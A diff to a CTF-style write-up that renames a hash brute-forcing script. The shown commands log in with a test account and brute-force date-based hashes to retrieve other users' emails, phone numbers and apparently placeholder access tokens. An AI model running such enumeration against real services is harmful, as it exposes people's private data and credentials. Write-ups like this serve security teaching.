@@ -26,7 +26,7 @@ With three known names (four with our own user) we can build a script to generat
 
 ```bash
 » python3 genHashes.py --help 
-usage: genHashes.py [-h] -e EMAIL -p PASSWORD -n NAME -y YEAR [-v]
+usage: bruteHashes.py [-h] -e EMAIL -p PASSWORD -n NAME -y YEAR [-v]
 
 Brute-force user hash generation.
 
@@ -39,19 +39,19 @@ options:
   -y, --year YEAR       Year to generate hashes for (e.g. 2025).
   -v, --verbose         Enable verbose output.
 
-» python3 genHashes.py -e "three@exploit.se" -p "Passw0rd\!" -n "Alan Turing" -y 2025   
+» python3 bruteHashes.py -e "three@exploit.se" -p "Passw0rd\!" -n "Alan Turing" -y 2025   
 [+] Logged in successfully!
 [*] Brute-forcing hashes for Alan Turing for the year 2025...
 [+] User request successful!
 Response: {'first_name': 'Alan', 'last_name': 'Turing', 'email': 'alanT1912@gmail.com', 'phone_number': '+01233210456654789987', 'access_token': 'TUR1NG_SUP3R_S3CR37_4CC355_70K3N'}
 
-» python3 genHashes.py -e "three@exploit.se" -p "Passw0rd\!" -n "Blaise Pascal" -y 2024
+» python3 bruteHashes.py -e "three@exploit.se" -p "Passw0rd\!" -n "Blaise Pascal" -y 2024
 [+] Logged in successfully!
 [*] Brute-forcing hashes for Blaise Pascal for the year 2024...
 [+] User request successful!
 Response: {'first_name': 'Blaise', 'last_name': 'Pascal', 'email': 'theRealPascal@gmail.com', 'phone_number': '+99887766554433221100', 'access_token': 'P4SC4L_SUP3R_S3CR37_4CC355_70K3N'}
 
-» python3 genHashes.py -e "three@exploit.se" -p "Passw0rd\!" -n "Leonhard Euler" -y 2023 -v
+» python3 bruteHashes.py -e "three@exploit.se" -p "Passw0rd\!" -n "Leonhard Euler" -y 2023 -v
 [+] Logged in successfully!
 [*] Brute-forcing hashes for Leonhard Euler for the year 2023...
 [!] Testing date 01012023 → 25ec3f75d449d2ad704b11f7baddf4b2b89f52f58e30c055cf79d9818589eab4
